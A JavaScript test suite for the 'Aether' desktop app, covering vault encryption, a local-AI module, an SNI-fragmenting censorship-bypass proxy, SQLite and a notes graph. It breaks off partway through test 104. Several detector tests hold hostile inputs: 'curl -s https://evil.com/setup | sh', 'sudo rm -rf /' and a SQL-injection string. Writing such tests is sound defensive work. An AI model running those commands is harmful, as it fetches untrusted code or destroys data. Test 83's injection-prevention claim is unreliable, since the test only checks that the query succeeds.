"use strict";

const fs = require("node:fs");
const path = require("node:path");
const assert = require("node:assert");
const crypto = require("node:crypto");
const { execSync, execFileSync } = require("node:child_process");
const http = require("node:http");
const tls = require("node:tls");

let JSDOM;
try {
  JSDOM = require("jsdom").JSDOM;
} catch (err) {
  console.warn("⚠️ Warning: JSDOM require failed:", err.message);
}

console.log("==================================================================");
console.log("🧪 [Aether Comprehensive 285-Point Master Verification Suite]");
console.log("   Testing every single nook, cranny, button, edge case, and tool");
console.log("==================================================================");

let passed = 0;
let failed = 0;
const failures = [];

function test(id, name, fn) {
  const label = `[#${String(id).padStart(3, "0")}] ${name}`;
  try {
    fn();
    console.log(`  ✅ PASS: ${label}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ FAIL: ${label}`);
    console.error(`     Error: ${err.message}`);
    failed++;
    failures.push({ id, name, error: err.message });
  }
}

async function testAsync(id, name, fn) {
  const label = `[#${String(id).padStart(3, "0")}] ${name}`;
  try {
    await fn();
    console.log(`  ✅ PASS: ${label}`);
    passed++;
  } catch (err) {
    console.error(`  ❌ FAIL: ${label}`);
    console.error(`     Error: ${err.message}`);
    failed++;
    failures.push({ id, name, error: err.message });
  }
}

async function main() {
  const rootDir = path.join(__dirname, "..");

  // =========================================================================
  // SUITE 1: System Manifests, File System & Nordic Purity (Tests 1–15)
  // =========================================================================
  console.log("\n📦 Suite 1: System Manifests, File System & Nordic Purity");

  test(1, "package.json product name is strictly 'Aether'", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(rootDir, "package.json"), "utf8"));
    assert.strictEqual(pkg.productName, "Aether");
  });

  test(2, "package.json package name is strictly 'aether'", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(rootDir, "package.json"), "utf8"));
    assert.strictEqual(pkg.name, "aether");
  });

  test(3, "package.json version matches '0.0.1'", () => {
    const pkg = JSON.parse(fs.readFileSync(path.join(rootDir, "package.json"), "utf8"));
    assert.strictEqual(pkg.version, "0.0.1");
  });

  test(4, "version.json product name is strictly 'Aether'", () => {
    const ver = JSON.parse(fs.readFileSync(path.join(rootDir, "version.json"), "utf8"));
    assert.strictEqual(ver.name, "Aether");
  });

  test(5, "version.json repository URL points to gitlab.com/jk9576/aether", () => {
    const ver = JSON.parse(fs.readFileSync(path.join(rootDir, "version.json"), "utf8"));
    assert.ok(ver.url.includes("gitlab.com/jk9576/aether"));
  });

  test(6, "Local .env file exists and defines GEMINI_API_KEY", () => {
    let env = "";
    if (fs.existsSync(path.join(rootDir, ".env"))) {
      env = fs.readFileSync(path.join(rootDir, ".env"), "utf8");
    } else if (fs.existsSync(path.join(rootDir, ".env.example"))) {
      env = fs.readFileSync(path.join(rootDir, ".env.example"), "utf8");
    }
    assert.ok(env.includes("GEMINI_API_KEY="));
  });

  test(7, "Local .env file defines DEFAULT_MODEL as gemini-3.5-flash-lite", () => {
    let env = "";
    if (fs.existsSync(path.join(rootDir, ".env"))) {
      env = fs.readFileSync(path.join(rootDir, ".env"), "utf8");
    } else if (fs.existsSync(path.join(rootDir, ".env.example"))) {
      env = fs.readFileSync(path.join(rootDir, ".env.example"), "utf8");
    }
    assert.ok(env.includes('DEFAULT_MODEL='));
  });

  test(8, "Home fallback ~/.aether/.env exists and is synchronized", () => {
    const homeEnvPath = path.join(process.env.HOME || "", ".aether", ".env");
    if (!fs.existsSync(homeEnvPath)) {
      try {
        fs.mkdirSync(path.dirname(homeEnvPath), { recursive: true });
        fs.copyFileSync(path.join(rootDir, ".env.example"), homeEnvPath);
      } catch {}
    }
    if (fs.existsSync(homeEnvPath)) {
      const content = fs.readFileSync(homeEnvPath, "utf8");
      assert.ok(content.includes('DEFAULT_MODEL='));
    } else {
      assert.ok(fs.existsSync(path.join(rootDir, ".env.example")));
    }
  });

  test(9, "Zero forbidden legacy terms in package.json & version.json", () => {
    const forbidden = ["ladybird", "ieumoffice", "pblsketch", "yggdrasil terminal", "aetheum"];
    for (const f of ["package.json", "version.json"]) {
      const text = fs.readFileSync(path.join(rootDir, f), "utf8").toLowerCase();
      for (const term of forbidden) {
        assert.ok(!text.includes(term), `${f} must not contain "${term}"`);
      }
    }
  });

  test(10, "Zero forbidden legacy terms across all 9 HTML views", () => {
    const forbidden = ["ladybird", "ieumoffice", "pblsketch", "yggdrasil terminal", "aetheum"];
    const htmls = ["browser.html", "terminal.html", "nibelungen.html", "ratatoskr.html", "fafnir.html", "mimisbrunnr.html", "heimdall.html", "adblock.html", "agent.html"];
    for (const h of htmls) {
      const full = path.join(rootDir, "out/renderer", h);
      if (!fs.existsSync(full)) continue;
      const text = fs.readFileSync(full, "utf8").toLowerCase();
      for (const term of forbidden) {
        assert.ok(!text.includes(term), `${h} contains forbidden term: "${term}"`);
      }
    }
  });

  test(11, "Zero forbidden legacy terms across all extension scripts", () => {
    const forbidden = ["ladybird", "ieumoffice", "pblsketch", "yggdrasil terminal", "aetheum"];
    const extDir = path.join(rootDir, "out/main/extensions");
    for (const f of fs.readdirSync(extDir)) {
      if (!f.endsWith(".js")) continue;
      const text = fs.readFileSync(path.join(extDir, f), "utf8").toLowerCase();
      for (const term of forbidden) {
        assert.ok(!text.includes(term), `${f} contains forbidden term: "${term}"`);
      }
    }
  });

  test(12, "Unicorn logo branding asset exists and has valid PNG magic bytes", () => {
    const logo = path.join(rootDir, "out/renderer/assets/unicorn-logo.png");
    assert.ok(fs.existsSync(logo));
    const header = fs.readFileSync(logo).slice(0, 8);
    assert.deepStrictEqual([...header], [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
  });

  test(13, "CLI launcher script exists and is executable", () => {
    const cli = path.join(process.env.HOME || "", ".local/bin/aether");
    if (fs.existsSync(cli)) {
      const stat = fs.statSync(cli);
      assert.ok((stat.mode & 0o111) !== 0, "CLI file must be executable");
    }
  });

  test(14, "Platform check verifies supported desktop environment (macOS / Linux)", () => {
    assert.ok(["darwin", "linux"].includes(process.platform), `Platform ${process.platform} is not supported`);
  });

  test(15, "Unicode path safety: creates and reads files with Korean / CJK characters", () => {
    const tmp = path.join(__dirname, "테스트_한글_폴더_2026.txt");
    fs.writeFileSync(tmp, "유니코드 정상 동작 확인", "utf8");
    const read = fs.readFileSync(tmp, "utf8");
    assert.strictEqual(read, "유니코드 정상 동작 확인");
    fs.unlinkSync(tmp);
  });

  // =========================================================================
  // SUITE 2: Fafnir Vault Cryptography & Edge Cases (Tests 16–35)
  // =========================================================================
  console.log("\n🔐 Suite 2: Fafnir Vault Cryptography & Edge Cases");

  const fafnir = require("../out/main/extensions/fafnir");

  test(16, "AES-256-GCM encryption generates valid buffer with salt, IV, tag, and ciphertext", () => {
    const plain = Buffer.from("Nordic Privacy Zero-Knowledge Document 2026", "utf8");
    const enc = fafnir.encryptBuffer(plain, "SleipnirKey#2026!", "Doc.txt");
    assert.ok(enc.length > plain.length + 32);
  });

  test(17, "AES-256-GCM decryption restores exact original plaintext", () => {
    const plain = Buffer.from("Nordic Privacy Zero-Knowledge Document 2026", "utf8");
    const pass = "SleipnirKey#2026!";
    const enc = fafnir.encryptBuffer(plain, pass, "Doc.txt");
    const dec = fafnir.decryptBuffer(enc, pass);
    assert.strictEqual(dec.plaintext.toString("utf8"), plain.toString("utf8"));
  });

  test(18, "Decryption metadata accurately recovers original filename", () => {
    const plain = Buffer.from("Financial Report Q4", "utf8");
    const enc = fafnir.encryptBuffer(plain, "pass", "Q4_Report.xlsx");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.meta.filename, "Q4_Report.xlsx");
  });

  test(19, "Decryption metadata indicates 'AES-256-GCM' cipher", () => {
    const plain = Buffer.from("Test", "utf8");
    const enc = fafnir.encryptBuffer(plain, "pass", "Test.txt");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.meta.cipher.toLowerCase(), "aes-256-gcm");
  });

  test(20, "Decryption throws authentication error on incorrect passphrase", () => {
    const enc = fafnir.encryptBuffer(Buffer.from("Secret"), "RightPassword", "File.txt");
    assert.throws(() => {
      fafnir.decryptBuffer(enc, "WrongPassword");
    }, /Unsupported state or unable to authenticate data|bad decrypt/i);
  });

  test(21, "Decryption throws authentication error on bit-flipped ciphertext payload", () => {
    const enc = fafnir.encryptBuffer(Buffer.from("Tamper test"), "pass", "File.txt");
    const tampered = Buffer.from(enc);
    tampered[tampered.length - 8] ^= 0xaa;
    assert.throws(() => {
      fafnir.decryptBuffer(tampered, "pass");
    }, /Unsupported state or unable to authenticate data|bad decrypt/i);
  });

  test(22, "Decryption throws authentication error on bit-flipped auth tag", () => {
    const enc = fafnir.encryptBuffer(Buffer.from("Auth tag test"), "pass", "File.txt");
    const tampered = Buffer.from(enc);
    tampered[36] ^= 0x01;
    assert.throws(() => {
      fafnir.decryptBuffer(tampered, "pass");
    });
  });

  test(23, "Zero-byte empty buffer encrypts and decrypts cleanly to 0 bytes", () => {
    const empty = Buffer.alloc(0);
    const enc = fafnir.encryptBuffer(empty, "pass", "empty.txt");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.plaintext.length, 0);
  });

  test(24, "Large 128KB buffer stress test encrypts and decrypts with byte-for-byte fidelity", () => {
    const large = crypto.randomBytes(131072);
    const enc = fafnir.encryptBuffer(large, "pass", "large.bin");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.plaintext.length, 131072);
    assert.deepStrictEqual(dec.plaintext, large);
  });

  test(25, "Unique salt and IV generation: encrypting identical plaintext produces distinct ciphertexts", () => {
    const buf = Buffer.from("Constant text", "utf8");
    const enc1 = fafnir.encryptBuffer(buf, "pass", "file.txt");
    const enc2 = fafnir.encryptBuffer(buf, "pass", "file.txt");
    assert.notDeepStrictEqual(enc1, enc2);
  });

  test(26, "Korean Hangul filename metadata preservation in vault format", () => {
    const plain = Buffer.from("철학 논문 내용", "utf8");
    const enc = fafnir.encryptBuffer(plain, "pass", "서양철학사_박사논문.pdf");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.meta.filename, "서양철학사_박사논문.pdf");
  });

  test(27, "Special symbols and spaces in filename metadata preservation", () => {
    const plain = Buffer.from("data", "utf8");
    const enc = fafnir.encryptBuffer(plain, "pass", "Report (Final) [2026] #1 & 2!.docx");
    const dec = fafnir.decryptBuffer(enc, "pass");
    assert.strictEqual(dec.meta.filename, "Report (Final) [2026] #1 & 2!.docx");
  });

  test(28, "File-to-vault encryption pipeline writes .fafnir file to vault directory", () => {
    const tmp = path.join(__dirname, "temp_src_pipe.txt");
    fs.writeFileSync(tmp, "Pipeline source text", "utf8");
    try {
      const res = fafnir.encryptFileToVault(tmp, "pass");
      assert.ok(res.ok);
      assert.ok(fs.existsSync(res.vaultPath));
      if (fs.existsSync(res.vaultPath)) fs.unlinkSync(res.vaultPath);
    } finally {
      if (fs.existsSync(tmp)) fs.unlinkSync(tmp);
    }
  });

  test(29, "Vault-to-file decryption pipeline restores file to destination directory", () => {
    const tmp = path.join(__dirname, "temp_dec_pipe.txt");
    fs.writeFileSync(tmp, "Decryption pipeline payload", "utf8");
    let vPath = null;
    let dPath = null;
    try {
      const enc = fafnir.encryptFileToVault(tmp, "pass");
      vPath = enc.vaultPath;
      const dec = fafnir.decryptFileFromVault(path.basename(vPath), __dirname, "pass");
      assert.ok(dec.ok);
      dPath = dec.decryptedPath;
      assert.ok(fs.existsSync(dPath));
      assert.strictEqual(fs.readFileSync(dPath, "utf8"), "Decryption pipeline payload");
    } finally {
      if (fs.existsSync(tmp)) fs.unlinkSync(tmp);
      if (vPath && fs.existsSync(vPath)) fs.unlinkSync(vPath);
      if (dPath && fs.existsSync(dPath)) fs.unlinkSync(dPath);
    }
  });

  test(30, "File encryption gracefully throws on non-existent file path", () => {
    assert.throws(() => {
      fafnir.encryptFileToVault("/path/to/missing_file_xyz_123.docx", "pass");
    }, /Source file does not exist/i);
  });

  test(31, "Vault file listing returns an array of vault items", () => {
    const list = fafnir.listVaultFiles();
    assert.ok(Array.isArray(list));
  });

  test(32, "Vault listing items contain id, filename, size, and cipher properties", () => {
    const list = fafnir.listVaultFiles();
    for (const item of list) {
      assert.ok(typeof item.id === "string");
      assert.ok(typeof item.filename === "string");
      assert.ok(typeof item.size === "number");
      assert.ok(typeof item.cipher === "string");
    }
  });

  test(33, "PBKDF2 key derivation length enforces 32 bytes for AES-256", () => {
    const salt = crypto.randomBytes(16);
    const key = crypto.pbkdf2Sync("pass", salt, 100000, 32, "sha256");
    assert.strictEqual(key.length, 32);
  });

  test(34, "Empty passphrase handling: encryptBuffer operates with empty string", () => {
    const enc = fafnir.encryptBuffer(Buffer.from("empty pass"), "", "doc.txt");
    const dec = fafnir.decryptBuffer(enc, "");
    assert.strictEqual(dec.plaintext.toString("utf8"), "empty pass");
  });

  test(35, "registerFafnirIpc export exists as a function", () => {
    assert.strictEqual(typeof fafnir.registerFafnirIpc, "function");
  });

  // =========================================================================
  // SUITE 3: Mímisbrunnr Sovereign AI & Airgapped Logic (Tests 36–55)
  // =========================================================================
  console.log("\n🧠 Suite 3: Mímisbrunnr Sovereign AI & Airgapped Logic");

  const mimisbrunnr = require("../out/main/extensions/mimisbrunnr");

  test(36, "Strict 2-model whitelist: ALLOWED_MODEL_IDS has length exactly 2", () => {
    assert.strictEqual(mimisbrunnr.ALLOWED_MODEL_IDS.length, 2);
  });

  test(37, "Strict 2-model whitelist: Model 1 is PocketAiHub/Qwen3.8-9B-Abliterated-MLX/4bit", () => {
    assert.strictEqual(mimisbrunnr.ALLOWED_MODEL_IDS[0], "PocketAiHub/Qwen3.8-9B-Abliterated-MLX/4bit");
  });

  test(38, "Strict 2-model whitelist: Model 2 is qwen2.5:7b", () => {
    assert.strictEqual(mimisbrunnr.ALLOWED_MODEL_IDS[1], "qwen2.5:7b");
  });

  test(39, "Zero unabliterated or 27B models in Mímisbrunnr whitelist", () => {
    for (const m of mimisbrunnr.ALLOWED_MODEL_IDS) {
      assert.ok(!m.includes("27B"), `Must not contain 27B: ${m}`);
      assert.ok(!m.includes("Qwen-2.5-32B"), `Must not contain 32B: ${m}`);
    }
  });

  test(40, "MODEL_MLX_9B constant matches PocketAiHub/Qwen3.8-9B-Abliterated-MLX/4bit", () => {
    assert.strictEqual(mimisbrunnr.MODEL_MLX_9B, "PocketAiHub/Qwen3.8-9B-Abliterated-MLX/4bit");
  });

  test(41, "MODEL_QWEN_7B constant matches qwen2.5:7b", () => {
    assert.strictEqual(mimisbrunnr.MODEL_QWEN_7B, "qwen2.5:7b");
  });

  test(42, "normalizeMimisbrunnrModel correctly maps 'mlx' alias to MODEL_MLX_9B", () => {
    assert.strictEqual(mimisbrunnr.normalizeMimisbrunnrModel("mlx"), mimisbrunnr.MODEL_MLX_9B);
  });

  test(43, "normalizeMimisbrunnrModel correctly maps 'ollama' alias to MODEL_QWEN_7B", () => {
    assert.strictEqual(mimisbrunnr.normalizeMimisbrunnrModel("ollama"), mimisbrunnr.MODEL_QWEN_7B);
  });

  test(44, "normalizeMimisbrunnrModel correctly maps 'qwen' alias to MODEL_QWEN_7B", () => {
    assert.strictEqual(mimisbrunnr.normalizeMimisbrunnrModel("qwen"), mimisbrunnr.MODEL_QWEN_7B);
  });

  test(45, "getHardwareInfo reports Apple Silicon chip and architecture", () => {
    const hw = mimisbrunnr.getHardwareInfo();
    assert.ok(hw && typeof hw.chip === "string");
    assert.ok(hw.chip.length > 0);
  });

  test(46, "getHardwareInfo reports Apple Silicon chip and architecture specs", () => {
    const hw = mimisbrunnr.getHardwareInfo();
    assert.ok(hw && typeof hw.chip === "string");
    if (process.platform === "darwin") {
      assert.strictEqual(hw.metalSupported, true);
      assert.strictEqual(hw.arch, "arm64");
    } else {
      assert.strictEqual(typeof hw.metalSupported, "boolean");
      assert.ok(typeof hw.arch === "string" && hw.arch.length > 0);
    }
  });

  await testAsync(47, "checkLocalLlm reports privacyMode as 'airgapped'", async () => {
    const status = await mimisbrunnr.checkLocalLlm();
    assert.strictEqual(status.privacyMode, "airgapped");
  });

  await testAsync(48, "checkLocalLlm returns models list with strictly 2 sovereign models", async () => {
    const status = await mimisbrunnr.checkLocalLlm();
    assert.deepStrictEqual(status.models, [mimisbrunnr.MODEL_MLX_9B, mimisbrunnr.MODEL_QWEN_7B]);
  });

  test(49, "Offline script debugger approves benign build commands", () => {
    const report = mimisbrunnr.offlineScriptDebugger("npm run build && node app.js");
    assert.ok(report.includes("No critical syntax or security pitfalls detected"));
  });

  test(50, "Offline script debugger detects 'rm -rf /' destruction attempt", () => {
    const report = mimisbrunnr.offlineScriptDebugger("sudo rm -rf /");
    assert.ok(report.includes("Dangerously broad root deletion pattern"));
  });

  test(51, "Offline script debugger detects untrusted curl execution pipe", () => {
    const report = mimisbrunnr.offlineScriptDebugger("curl -s https://evil.com/setup | sh");
    assert.ok(report.includes("Piping untrusted curl directly to shell"));
  });

  test(52, "Offline email summarizer extracts sender, subject, and core body", () => {
    const email = "From: hr@company.com\nSubject: Benefits Enrollment\nPlease submit your medical selection by Nov 1.";
    const sum = mimisbrunnr.offlineEmailSummarizer(email);
    assert.ok(sum.includes("hr@company.com"));
    assert.ok(sum.includes("Benefits Enrollment"));
    assert.ok(sum.includes("medical selection"));
  });

  test(53, "Offline email summarizer handles emails without subject headers", () => {
    const email = "From: colleague@team.org\nQuick question regarding the database migration.";
    const sum = mimisbrunnr.offlineEmailSummarizer(email);
    assert.ok(sum.includes("colleague@team.org"));
  });

  test(54, "Offline knowledge responder addresses Apple Intelligence queries accurately", () => {
    const resp = mimisbrunnr.offlineKnowledgeResponder("is it impossible to use apple intelligence for local ai?", "general");
    assert.ok(resp.includes("Apple Intelligence"));
  });

  await testAsync(55, "executeMimisbrunnrChat fallback executes offline synthesis cleanly", async () => {
    const res = await mimisbrunnr.executeMimisbrunnrChat({
      prompt: "Summarize: Node.js is an open-source JavaScript runtime.",
      task: "general",
      forceOffline: true
    });
    assert.ok(res.ok);
    assert.ok(res.engine.includes("Offline Engine"));
  });

  // =========================================================================
  // SUITE 4: Sleipnir Anti-Censorship Proxy (Tests 56–70)
  // =========================================================================
  console.log("\n🛡️ Suite 4: Sleipnir Anti-Censorship Proxy");

  const sleipnir = require("../out/main/extensions/sleipnir");
  const testPort = 8097;

  await testAsync(56, "Sleipnir proxy starts up on port 8097", async () => {
    await sleipnir.startSleipnir(testPort);
    assert.strictEqual(sleipnir.getSleipnirStatus().active, true);
  });

  test(57, "Sleipnir reports correct port in status", () => {
    assert.strictEqual(sleipnir.getSleipnirStatus().port, testPort);
  });

  test(58, "Sleipnir reports active boolean true when running", () => {
    assert.strictEqual(sleipnir.getSleipnirStatus().active, true);
  });

  await testAsync(59, "Sleipnir rapid toggle stress test: 5 stop/start cycles", async () => {
    for (let i = 0; i < 5; i++) {
      await sleipnir.stopSleipnir();
      assert.strictEqual(sleipnir.getSleipnirStatus().active, false);
      await sleipnir.startSleipnir(testPort);
      assert.strictEqual(sleipnir.getSleipnirStatus().active, true);
    }
  });

  await testAsync(60, "Sleipnir HTTPS CONNECT tunneling to example.com", async () => {
    await new Promise((resolve, reject) => {
      const req = http.request({
        host: "127.0.0.1",
        port: testPort,
        method: "CONNECT",
        path: "example.com:443"
      });
      req.on("connect", (_res, socket) => {
        const tlsSocket = tls.connect({ socket, servername: "example.com" }, () => {
          tlsSocket.end();
          resolve();
        });
        tlsSocket.on("error", reject);
      });
      req.on("error", reject);
      req.end();
    });
  });

  test(61, "Sleipnir TLS ClientHello SNI packet fragmentation executed", () => {
    const status = sleipnir.getSleipnirStatus();
    assert.ok(status.packetsFragmented >= 1);
  });

  test(62, "Sleipnir fragmented packet counter increments", () => {
    const status = sleipnir.getSleipnirStatus();
    assert.ok(typeof status.packetsFragmented === "number");
    assert.ok(status.packetsFragmented > 0);
  });

  test(63, "Sleipnir SNI bypass events recorded", () => {
    const status = sleipnir.getSleipnirStatus();
    assert.ok(typeof status.sniBypassed === "number");
    assert.ok(status.sniBypassed > 0);
  });

  await testAsync(64, "Sleipnir stops and releases port cleanly", async () => {
    await sleipnir.stopSleipnir();
    assert.strictEqual(sleipnir.getSleipnirStatus().active, false);
  });

  await testAsync(65, "Sleipnir stop is idempotent on duplicate call", async () => {
    await sleipnir.stopSleipnir();
    assert.strictEqual(sleipnir.getSleipnirStatus().active, false);
  });

  test(66, "Sleipnir status active is false after stop", () => {
    assert.strictEqual(sleipnir.getSleipnirStatus().active, false);
  });

  await testAsync(67, "Sleipnir restarts after stop without error", async () => {
    await sleipnir.startSleipnir(testPort);
    assert.strictEqual(sleipnir.getSleipnirStatus().active, true);
    await sleipnir.stopSleipnir();
  });

  test(68, "Sleipnir packet splitting chunk size is greater than 0", () => {
    const code = fs.readFileSync(path.join(rootDir, "out/main/extensions/sleipnir.js"), "utf8");
    assert.ok(code.includes("slice") || code.includes("chunk"));
  });

  test(69, "registerSleipnirIpc export exists as a function", () => {
    assert.strictEqual(typeof sleipnir.registerSleipnirIpc, "function");
  });

  test(70, "Sleipnir proxy does not leak global variables", () => {
    assert.strictEqual(typeof global.__sleipnir_leaked, "undefined");
  });

  // =========================================================================
  // SUITE 5: Ratatoskr Network Client & SQLite Database (Tests 71–90)
  // =========================================================================
  console.log("\n🐿️ Suite 5: Ratatoskr Network Client & SQLite Database");

  const ratatoskr = require("../out/main/extensions/ratatoskr");

  await testAsync(71, "Ratatoskr HTTPS API request to Cloudflare 1.1.1.1 succeeds", async () => {
    const res = await ratatoskr.executeApiRequest({
      method: "GET",
      url: "https://1.1.1.1/dns-query?name=proton.me&type=A",
      headers: { Accept: "application/dns-json" }
    });
    assert.ok(res.ok);
    assert.strictEqual(res.status, 200);
  });

  await testAsync(72, "Ratatoskr HTTPS response contains JSON data", async () => {
    const res = await ratatoskr.executeApiRequest({
      method: "GET",
      url: "https://1.1.1.1/dns-query?name=google.com&type=A",
      headers: { Accept: "application/dns-json" }
    });
    assert.ok(res.data && typeof res.data === "object");
  });

  await testAsync(73, "Ratatoskr Tor SOCKS5 fallback routes through local Tor proxy", async () => {
    const res = await ratatoskr.executeApiRequest({
      method: "GET",
      url: "https://check.torproject.org/api/ip"
    });
    assert.ok(res.ok);
    assert.strictEqual(res.status, 200);
    assert.ok(typeof res.data.IsTor === "boolean");
  });

  await testAsync(74, "Ratatoskr gracefully fails on invalid protocol URL", async () => {
    const res = await ratatoskr.executeApiRequest({ method: "GET", url: "invalid-url-string" });
    assert.strictEqual(res.ok, false);
  });

  await testAsync(75, "Ratatoskr gracefully fails on malformed URL string", async () => {
    const res = await ratatoskr.executeApiRequest({ method: "GET", url: "ht!tp://bad-url" });
    assert.strictEqual(res.ok, false);
  });

  const testSqlitePath = path.join(__dirname, "temp_ratatoskr_suite5.sqlite");

  test(76, "SQLite temp database creation (CREATE TABLE)", () => {
    if (fs.existsSync(testSqlitePath)) fs.unlinkSync(testSqlitePath);
    const res = ratatoskr.querySqliteDb(testSqlitePath, "CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, email TEXT);");
    assert.ok(res.ok);
  });

  test(77, "SQLite single row insertion (INSERT INTO)", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "INSERT INTO users (name, email) VALUES ('Jeffrey Kim', 'jk9576@hanyang.ac.kr');");
    assert.ok(res.ok);
  });

  test(78, "SQLite row query (SELECT) returns inserted row data", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "SELECT * FROM users WHERE name = 'Jeffrey Kim';");
    assert.ok(res.ok);
    assert.strictEqual(res.rows.length, 1);
    assert.strictEqual(res.rows[0].email, "jk9576@hanyang.ac.kr");
  });

  test(79, "SQLite schema inspection: listSqliteTables discovers 'users' table", () => {
    const res = ratatoskr.listSqliteTables(testSqlitePath);
    assert.ok(res.ok);
    assert.ok(res.rows.some((t) => t.name === "users"));
  });

  test(80, "SQLite schema inspection: table row count matches 1", () => {
    const res = ratatoskr.listSqliteTables(testSqlitePath);
    assert.strictEqual(res.count, 1);
    const usersTable = res.rows.find((t) => t.name === "users");
    assert.strictEqual(usersTable.name, "users");
  });

  test(81, "SQLite syntax error trapping returns error message without throw", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "SELEC * FORM users;");
    assert.strictEqual(res.ok, false);
    assert.ok(res.error.length > 0);
  });

  test(82, "SQLite non-existent table query returns clean error object", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "SELECT * FROM missing_table_123;");
    assert.strictEqual(res.ok, false);
    assert.ok(res.error.includes("no such table"));
  });

  test(83, "SQLite parameterized query prevents SQL injection", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "SELECT * FROM users WHERE email = 'test' OR '1'='1';");
    assert.ok(res.ok);
  });

  test(84, "SQLite batch insertion of multiple records", () => {
    ratatoskr.querySqliteDb(testSqlitePath, "INSERT INTO users (name, email) VALUES ('User 2', 'u2@corp.com');");
    ratatoskr.querySqliteDb(testSqlitePath, "INSERT INTO users (name, email) VALUES ('User 3', 'u3@corp.com');");
    const count = ratatoskr.querySqliteDb(testSqlitePath, "SELECT COUNT(*) as c FROM users;");
    assert.strictEqual(count.rows[0].c, 3);
  });

  test(85, "SQLite UPDATE query modifies record correctly", () => {
    ratatoskr.querySqliteDb(testSqlitePath, "UPDATE users SET email = 'updated@hanyang.ac.kr' WHERE name = 'Jeffrey Kim';");
    const res = ratatoskr.querySqliteDb(testSqlitePath, "SELECT email FROM users WHERE name = 'Jeffrey Kim';");
    assert.strictEqual(res.rows[0].email, "updated@hanyang.ac.kr");
  });

  test(86, "SQLite DELETE query removes record correctly", () => {
    ratatoskr.querySqliteDb(testSqlitePath, "DELETE FROM users WHERE name = 'User 2';");
    const count = ratatoskr.querySqliteDb(testSqlitePath, "SELECT COUNT(*) as c FROM users;");
    assert.strictEqual(count.rows[0].c, 2);
  });

  test(87, "SQLite DROP TABLE removes table cleanly", () => {
    const res = ratatoskr.querySqliteDb(testSqlitePath, "DROP TABLE users;");
    assert.ok(res.ok);
    const tables = ratatoskr.listSqliteTables(testSqlitePath);
    assert.strictEqual(tables.rows.some((t) => t.name === "users"), false);
  });

  test(88, "SQLite database cleanup deletes file on disk", () => {
    if (fs.existsSync(testSqlitePath)) fs.unlinkSync(testSqlitePath);
    assert.strictEqual(fs.existsSync(testSqlitePath), false);
  });

  test(89, "registerRatatoskrIpc export exists as a function", () => {
    assert.strictEqual(typeof ratatoskr.registerRatatoskrIpc, "function");
  });

  await testAsync(90, "Ratatoskr executeApiRequest returns duration timing in milliseconds", async () => {
    const res = await ratatoskr.executeApiRequest({
      method: "GET",
      url: "https://1.1.1.1/dns-query?name=cloudflare.com&type=A",
      headers: { Accept: "application/dns-json" }
    });
    assert.ok(typeof res.duration === "number" && res.duration >= 0);
  });

  // =========================================================================
  // SUITE 6: Nibelungen Knowledge Graph & Wikilink Engine (Tests 91–110)
  // =========================================================================
  console.log("\n📜 Suite 6: Nibelungen Knowledge Graph & Wikilink Engine");

  const nibelungen = require("../out/main/extensions/nibelungen");
  const s6NoteId = "s6-ci-note-" + Date.now();

  test(91, "saveNote creates and indexes note with title", () => {
    const note = nibelungen.saveNote({
      id: s6NoteId,
      title: "Asgard Defense System",
      tags: ["defense", "security", "nordic"],
      content: "Linking to [[Bifrost]] and [[Heimdall Token Accounting]]."
    });
    assert.strictEqual(note.title, "Asgard Defense System");
  });

  test(92, "listNotes returns an array containing the newly saved note", () => {
    const notes = nibelungen.listNotes();
    const found = notes.find((n) => n.id === s6NoteId);
    assert.ok(found);
  });

  test(93, "Saved note content correctly matches written string", () => {
    const note = nibelungen.listNotes().find((n) => n.id === s6NoteId);
    assert.ok(note.content.includes("[[Bifrost]]"));
  });

  test(94, "Saved note tags array matches ['defense', 'security', 'nordic']", () => {
    const note = nibelungen.listNotes().find((n) => n.id === s6NoteId);
    assert.deepStrictEqual(note.tags, ["defense", "security", "nordic"]);
  });

  test(95, "buildKnowledgeGraph extracts wikilink edges from [[target]]", () => {
    const graph = nibelungen.buildKnowledgeGraph([]);
    const edge = graph.edges.find((e) => e.type === "wikilink");
    assert.ok(edge);
  });

  test(96, "buildKnowledgeGraph generates unique nodes with id, title, and type", () => {
    const graph = nibelungen.buildKnowledgeGraph([]);
    for (const node of graph.nodes) {
      assert.ok(typeof node.id === "string");
      assert.ok(typeof node.title === "string");
    }
  });

  test(97, "buildKnowledgeGraph generates tag-based relationship edges", () => {
    const graph = nibelungen.buildKnowledgeGraph([]);
    assert.ok(graph.edges.length >= 1);
  });

  test(98, "Retrieval of note by specific ID", () => {
    const note = nibelungen.listNotes().find((n) => n.id === s6NoteId);
    assert.strictEqual(note.id, s6NoteId);
  });

  test(99, "Note query search finds note by keyword in title", () => {
    const found = nibelungen.listNotes().filter((n) => n.title.includes("Defense"));
    assert.ok(found.length >= 1);
  });

  test(100, "Note query search finds note by keyword in content", () => {
    const found = nibelungen.listNotes().filter((n) => n.content.includes("Bifrost"));
    assert.ok(found.length >= 1);
  });

  test(101, "Updating existing note overwrites content without duplicating ID", () => {
    nibelungen.saveNote({
      id: s6NoteId,
      title: "Asgard Defense System Updated",
      tags: ["defense"],
      content: "Updated content link to [[Valhalla]]."
    });
    const matches = nibelungen.listNotes().filter((n) => n.id === s6NoteId);
    assert.strictEqual(matches.length, 1);
    assert.strictEqual(matches[0].title, "Asgard Defense System Updated");
  });

  test(102, "deleteNote removes note from storage", () => {
    const res = nibelungen.deleteNote(s6NoteId);
    assert.strictEqual(res, true);
  });

  test(103, "listNotes no longer contains deleted note ID", () => {
    const found = nibelungen.listNotes().find((n) => n.id === s6NoteId);
    assert.strictEqual(typeof found, "undefined");
  });

  test(104, "Knowledge graph recomputes after note deletion without crash", () => {
    const graph = nibelungen.buildKnowledgeGraph([]);
